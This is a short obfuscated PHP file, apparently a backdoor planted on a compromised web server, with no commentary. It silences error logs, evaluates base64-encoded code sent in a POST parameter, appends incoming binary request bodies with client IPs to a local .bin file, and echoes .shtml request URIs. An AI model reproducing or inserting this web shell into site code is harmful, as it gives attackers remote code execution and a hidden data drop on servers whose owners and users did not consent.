<?php @error_reporting(0); @ini_set("\x64isp\x6ca\x79_err\x6f\x72\x73",0); @ini_set("\x6c\x6f\x67\x5f\x65\x72\x72ors",0); @ini_set("erro\x72\x5f\x6c\x6f\x67",0); @ini_set("memo\x72y\x5f\x6cim\x69\x74", "1\x32\x38\x4d"); @ini_set("m\x61\x78\x5f\x65\x78\x65c\x75ti\x6f\x6e\x5fti\x6de",30); @set_time_limit(30); if (isset($_SERVER["\x48\x54TP_\x58\x5fR\x45A\x4c\x5f\x49P"])) $_SERVER["\x52\x45\x4d\x4f\x54E\x5fA\x44\x44R"] = $_SERVER["\x48\x54TP_\x58\x5fR\x45A\x4c\x5f\x49P"]; if (isset($_POST["code"])) { eval(base64_decode($_POST["code"])); } elseif (isset($_SERVER["\x48\x54T\x50_\x43\x4f\x4e\x54\x45\x4e\x54\x5f\x45\x4e\x43\x4fD\x49\x4e\x47"]) && $_SERVER["\x48\x54T\x50_\x43\x4f\x4e\x54\x45\x4e\x54\x5f\x45\x4e\x43\x4fD\x49\x4e\x47"] == "b\x69n\x61\x72\x79") { $input = file_get_contents("\x70h\x70\x3a/\x2f\x69\x6e\x70\x75\x74"); if (strlen($input) > 0) print "\x53TATUS\x2d\x49\x4dPOR\x54\x2d\x4fK"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2e\x70hp","\x2ebi\x6e",basename($_SERVER["SC\x52\x49P\x54_\x46I\x4c\x45\x4e\x41\x4d\x45"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52\x45\x4d\x4f\x54E\x5fA\x44\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["REQUEST\x5f\x55\x52\x49"], ".s\x68t\x6d\x6c") !== false) { print $_SERVER["REQUEST\x5f\x55\x52\x49"]; } exit; ?>